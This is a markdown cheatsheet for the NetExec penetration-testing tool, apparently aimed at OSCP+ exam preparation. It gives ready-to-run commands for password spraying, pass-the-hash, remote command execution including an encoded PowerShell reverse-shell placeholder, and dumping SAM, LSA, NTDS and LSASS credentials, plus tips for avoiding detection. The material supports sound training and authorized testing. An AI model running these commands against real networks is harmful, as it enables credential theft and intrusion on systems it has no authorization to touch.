# NetExec (nxc) - Complete OSCP+ Cheatsheet

NetExec (nxc) is the modern successor to CrackMapExec (CME). It automates network enumeration, authentication testing, and post-exploitation across SMB, LDAP, WinRM, MSSQL, SSH, RDP, FTP, and WMI protocols.

**Syntax:** `nxc <protocol> <target> [options] [-M module]`

---

## Installation

```bash
# Kali Linux
sudo apt install netexec

# Using pipx (latest version)
sudo apt install pipx git
pipx ensurepath
pipx install git+https://github.com/Pennyw0rth/NetExec
```

---

## SMB Enumeration

### Host Discovery & Basic Info

```bash
# Check if host is alive and get OS info
nxc smb 10.10.10.5

# Scan entire subnet
nxc smb 10.10.10.0/24

# Scan from a file of targets
nxc smb targets.txt

# Check SMB signing (for relay attacks)
nxc smb 10.10.10.0/24 --gen-relay-list relay.txt
```

### Null & Guest Session Enumeration

```bash
# Null session - enumerate shares
nxc smb 10.10.10.5 -u '' -p ''

# Guest session
nxc smb 10.10.10.5 -u 'guest' -p ''

# Null session - enumerate users
nxc smb 10.10.10.5 -u '' -p '' --users

# Null session - RID brute force users
nxc smb 10.10.10.5 -u '' -p '' --rid-brute

# Null session - password policy
nxc smb 10.10.10.5 -u '' -p '' --pass-pol
```

### Authenticated Enumeration

```bash
# Enumerate shares
nxc smb 10.10.10.5 -u username -p password --shares

# Enumerate users
nxc smb 10.10.10.5 -u username -p password --users

# Enumerate groups
nxc smb 10.10.10.5 -u username -p password --groups

# Enumerate local groups
nxc smb 10.10.10.5 -u username -p password --local-groups

# Enumerate logged on users
nxc smb 10.10.10.5 -u username -p password --loggedon-users

# Enumerate sessions
nxc smb 10.10.10.5 -u username -p password --sessions

# RID brute force
nxc smb 10.10.10.5 -u username -p password --rid-brute

# Password policy
nxc smb 10.10.10.5 -u username -p password --pass-pol

# All-in-one enumeration
nxc smb 10.10.10.5 -u username -p password --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
```

---

## Authentication & Password Attacks

### Password Spraying

```bash
# Single password against multiple users
nxc smb 10.10.10.5 -u users.txt -p 'Password123!' -d DOMAIN --continue-on-success

# Multiple passwords against multiple users (one-to-one matching)
nxc smb 10.10.10.5 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success

# Brute force (all combinations)
nxc smb 10.10.10.5 -u users.txt -p passwords.txt --continue-on-success

# Local authentication
nxc smb 10.10.10.5 -u users.txt -p passwords.txt --local-auth --continue-on-success

# With jitter to avoid detection
nxc smb 10.10.10.5 -u users.txt -p passwords.txt --jitter 5

# Fail limits to avoid lockouts
nxc smb 10.10.10.5 -u users.txt -p passwords.txt --ufail-limit 3
```

### Pass the Hash (PTH)

```bash
# Pass NTLM hash
nxc smb 10.10.10.5 -u admin -H aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99

# PTH with domain
nxc smb 10.10.10.5 -u admin -H <NTLM_HASH> -d DOMAIN

# PTH across subnet
nxc smb 10.10.10.0/24 -u admin -H <NTLM_HASH> --local-auth
```

### Kerberos Authentication

```bash
# With password
nxc smb 10.10.10.5 -u admin -p 'password' -d DOMAIN -k

# With cached ticket (ccache)
export KRB5CCNAME=/path/to/ticket.ccache
nxc smb 10.10.10.5 -u admin --use-kcache -k

# With AES key
nxc smb 10.10.10.5 -u admin --aesKey <AES_KEY> -k

# Specify KDC
nxc smb 10.10.10.5 -u admin -p 'password' -d DOMAIN -k --kdcHost dc01.domain.local
```

### SSH Brute Force

```bash
nxc ssh 10.10.10.5 -u username -p password
nxc ssh 10.10.10.5 -u users.txt -p passwords.txt --continue-on-success
```

---

## SMB Share Interaction

### Spider Shares (Search for Files)

```bash
# Spider all shares
nxc smb 10.10.10.5 -u username -p password -M spider_plus

# Spider and download files
nxc smb 10.10.10.5 -u username -p password -M spider_plus -o READ_ONLY=false

# Spider with download
nxc smb 10.10.10.5 -u username -p password -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=.
```

### File Operations

```bash
# Download a file from share
nxc smb 10.10.10.5 -u username -p password --get-file target_file output_file --share sharename

# Upload a file to share
nxc smb 10.10.10.5 -u username -p password --put-file local_file remote_file
```

---

## Command Execution

### Remote Command Execution (need admin rights)

```bash
# Execute CMD command
nxc smb 10.10.10.5 -u admin -p password -x 'whoami'

# Execute PowerShell command
nxc smb 10.10.10.5 -u admin -p password -X 'Get-Process'

# Choose execution method (smbexec, atexec, mmcexec, wmiexec)
nxc smb 10.10.10.5 -u admin -p password --exec-method smbexec -x 'whoami'

# Execute without output
nxc smb 10.10.10.5 -u admin -p password -x 'whoami' --no-output

# Execute encoded PowerShell reverse shell
nxc smb 10.10.10.5 -u admin -p password -X 'powershell -e <BASE64_PAYLOAD>'
```

### WinRM Command Execution

```bash
# Check if WinRM is accessible
nxc winrm 10.10.10.5 -u username -p password

# Execute command via WinRM
nxc winrm 10.10.10.5 -u username -p password -x 'whoami'

# Execute PowerShell via WinRM
nxc winrm 10.10.10.5 -u username -p password -X 'Get-Process'
```

---

## Credential Dumping

### SAM Database (Local Hashes)

```bash
# Dump SAM hashes (need local admin)
nxc smb 10.10.10.5 -u admin -p password --sam
```

### LSA Secrets

```bash
# Dump LSA secrets
nxc smb 10.10.10.5 -u admin -p password --lsa
```

### NTDS.dit (Domain Controller - All Domain Hashes)

```bash
# Dump NTDS.dit (must be run against DC)
nxc smb 10.10.10.5 -u admin -p password --ntds

# Using ntdsutil method
nxc smb 10.10.10.5 -u admin -p password -M ntdsutil
```

### LSASSY (Dump LSASS Memory)

```bash
nxc smb 10.10.10.5 -u admin -p password -M lsassy
```

### DPAPI Secrets

```bash
nxc smb 10.10.10.5 -u admin -p password --dpapi
```

### GPP Passwords

```bash
nxc smb 10.10.10.5 -u username -p password -M gpp_password
```

---

## LDAP Enumeration

### User & Domain Enumeration

```bash
# Anonymous LDAP bind
nxc ldap 10.10.10.5 -u '' -p ''

# Enumerate users
nxc ldap 10.10.10.5 -u username -p password --users

# Enumerate groups
nxc ldap 10.10.10.5 -u username -p password --groups

# Get domain SID
nxc ldap 10.10.10.5 -u username -p password --get-sid

# Find delegation
nxc ldap 10.10.10.5 -u username -p password --find-delegation

# Pre-created computer accounts (Pre2K)
nxc ldap 10.10.10.5 -u username -p password -M pre2k
```

### BloodHound Collection

```bash
# Collect BloodHound data via LDAP
nxc ldap 10.10.10.5 -u username -p password --bloodhound -c all -ns 10.10.10.5
```

### GMSA Password

```bash
# Read GMSA password
nxc ldap 10.10.10.5 -u username -p password --gmsa

# Convert GMSA ID
nxc ldap 10.10.10.5 -u username -p password --gmsa-convert-id <ID>

# Decrypt GMSA password
nxc ldap domain.local -u username -p password --gmsa-decrypt-lsa <GMSA_ACCOUNT>
```

### DACL Read (ACL Abuse)

```bash
# Read all DACLs on a target user
nxc ldap 10.10.10.5 -u username -p password --kdcHost 10.10.10.5 -M daclread -o TARGET=targetuser ACTION=read

# Read specific principal's rights on target
nxc ldap 10.10.10.5 -u username -p password --kdcHost 10.10.10.5 -M daclread -o TARGET=targetuser ACTION=read PRINCIPAL=attackeruser
```

---

## MSSQL

```bash
# Check MSSQL access
nxc mssql 10.10.10.5 -u username -p password

# Local auth
nxc mssql 10.10.10.5 -u username -p password --local-auth

# Execute SQL query
nxc mssql 10.10.10.5 -u username -p password -q 'SELECT name FROM master.dbo.sysdatabases;'

# Execute command via xp_cmdshell
nxc mssql 10.10.10.5 -u username -p password -x 'whoami'

# Execute PowerShell
nxc mssql 10.10.10.5 -u username -p password -X 'Get-Process'
```

---

## RDP

```bash
# Check RDP access
nxc rdp 10.10.10.5 -u username -p password

# Brute force RDP
nxc rdp 10.10.10.5 -u users.txt -p passwords.txt

# Screenshot RDP session
nxc rdp 10.10.10.5 -u username -p password --screenshot
```

---

## FTP

```bash
# Check FTP access
nxc ftp 10.10.10.5 -u username -p password

# List files
nxc ftp 10.10.10.5 -u username -p password --ls

# List specific folder
nxc ftp 10.10.10.5 -u username -p password --ls folder_name

# Download file
nxc ftp 10.10.10.5 -u username -p password --ls folder_name --get file_name
```

---

## WMI

```bash
# Execute command via WMI
nxc wmi 10.10.10.5 -u admin -p password -x 'whoami'
```

---

## Useful Modules

```bash
# List all modules for a protocol
nxc smb -L
nxc ldap -L

# Spider Plus - search shares for interesting files
nxc smb 10.10.10.5 -u user -p pass -M spider_plus

# WebDAV check
nxc smb 10.10.10.5 -u user -p pass -M webdav

# Enum AV/EDR
nxc smb 10.10.10.5 -u user -p pass -M enum_av

# MSOL (Azure AD Connect password)
nxc smb 10.10.10.5 -u user -p pass -M msol

# Zerologon check
nxc smb 10.10.10.5 -u '' -p '' -M zerologon

# PetitPotam
nxc smb 10.10.10.5 -u '' -p '' -M petitpotam

# noPAC check
nxc smb 10.10.10.5 -u user -p pass -M nopac
```

---

## OSCP+ Exam Tips

### Quick Wins Workflow

```bash
# Step 1: Scan subnet for live hosts
nxc smb 10.10.10.0/24

# Step 2: Try null/guest sessions on all hosts
nxc smb 10.10.10.0/24 -u '' -p '' --shares
nxc smb 10.10.10.0/24 -u 'guest' -p '' --shares

# Step 3: Once you have creds, spray everywhere
nxc smb 10.10.10.0/24 -u user -p password --shares
nxc winrm 10.10.10.0/24 -u user -p password
nxc rdp 10.10.10.0/24 -u user -p password
nxc mssql 10.10.10.0/24 -u user -p password
nxc ssh 10.10.10.0/24 -u user -p password

# Step 4: Dump creds from every machine you can admin
nxc smb 10.10.10.0/24 -u admin -p password --sam
nxc smb 10.10.10.0/24 -u admin -p password --lsa

# Step 5: PTH with any new hashes
nxc smb 10.10.10.0/24 -u admin -H <HASH> --sam

# Step 6: On DC - dump everything
nxc smb DC_IP -u domadmin -p password --ntds
```

### AD Set Attack Flow

```bash
# Enumerate AD
nxc ldap DC_IP -u user -p password --bloodhound -c all -ns DC_IP

# Find where user has admin
nxc smb 10.10.10.0/24 -u user -p password

# Check for Kerberoastable accounts
# (use impacket-GetUserSPNs alongside nxc)

# Spray any cracked passwords
nxc smb 10.10.10.0/24 -u newuser -p newpass --continue-on-success
```

---

## Pro Tips

- Green `[+]` = successful auth, `Pwn3d!` = you have admin access
- Always use `--continue-on-success` when spraying to find all valid creds
- Use `--local-auth` when targeting local accounts instead of domain accounts
- Results are stored in a database, use `nxcdb` to query previous results
- Use `-d .` as shorthand for local authentication
- Combine with Impacket tools: use nxc to find access, then psexec/wmiexec for shells